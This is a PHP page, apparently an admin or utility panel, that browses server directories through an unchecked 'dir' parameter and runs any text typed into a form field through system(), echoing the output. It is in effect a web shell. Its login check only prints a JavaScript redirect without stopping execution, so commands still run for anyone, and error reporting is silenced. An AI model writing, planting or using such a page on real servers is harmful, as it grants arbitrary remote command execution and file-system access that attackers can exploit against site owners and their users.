<?php 
session_start(); 
 //if($_SERVER['HTTP_HOST']=='localhost:8000')
  error_reporting(0);
 //else
  //error_reporting(E_ALL);
ini_set('post_max_size', '64M');
ini_set('upload_max_filesize', '64M');
ini_set('max_execution_time', 600);
ini_set('memory_limit','1024M');

if(!isset($_SESSION['muser'])) echo "<script>window.location='../l/login.php?ref=t';</script>";

?>

<html>
<head><title>T</title>

<link href="style.css" rel="stylesheet" type="text/css">

</head>

<body>
<div align="right"><a href="../l/logout.php">Logout</a></div>
<div align="center" class="heads">

<form action="" method="post">
<input type="text" size="60" name="system_command" />
<input type="submit" value="Execute Command" name="execute_command" />
</form>

<?php

$dir = isset($_GET['dir'])? $_GET['dir'] : '.';

chdir($dir);

$basedir = getcwd();
$mypath = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'];
$mypath = substr($mypath,0,strpos($mypath,'/z/index.php'));

$basedir = str_replace('\\','/',$basedir); 

if (is_dir($basedir)) { //show directory list

$parent = dirname($basedir);

$cur = $basedir;

while (substr($cur,0,1) == '/') {
        $cur = substr($cur,1,strlen($cur));
        $path .= '/'; }

$p_out = $path;
while (strlen($cur) > 0) {
$k = strpos($cur,'/');
if (!strpos($cur,'/')) $k = strlen($cur);
$my_cur_dir = $s = substr($cur,0,$k);
$cur = substr($cur,$k+1,strlen($cur));
$path .= $s.'/';
$p_out .= "<a href='?dir=$path'>$s</a>/";
}

echo "<br><center><div>Current dir: ".$p_out."</div>";

$my_main_path = $_SERVER['SCRIPT_FILENAME'];
$my_main_path = str_replace("index.php","",$my_main_path );
$current_path = $_SERVER['REQUEST_SCHEME']."://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];


echo "<center><div class=bigblock><div class=contents>";
echo "<div class=dirlist>";
echo "<div class=filedirtitle>Subdirectories</div>";
echo "<b><center><a href='?dir=$parent'>Parent directory</a></b></center><br>\n";

$glob = array();$c = 0;
if ($dh = opendir(getcwd())) {
        while (($file = readdir($dh)) !== false) {
            if ($file != '..' && $file != '.') $glob[$c++] = $file;
        }
    closedir($dh);
    }
sort($glob);
foreach ($glob as $filename) {
	if (is_dir($filename)) 
	
	{
		//it's a directory
		echo "&nbsp;&nbsp;/<a href='?dir=$basedir/$filename'>$filename</a><br /><br />\n";
	}
	else 
	{
		//ibrahim
		//it's a file
		//echo "&nbsp;&nbsp;/$filename<br /><br />";	
	}
	
	
  }
}

if(isset($_POST['execute_command']))
{
	$system_command = $_POST['system_command'];
	echo "<pre>";
	$command = system($system_command,$return_value);
	echo "<h3>Return Code: $return_value </h3>";
	echo "</pre>";
}

?>

</div>
</body>

</html>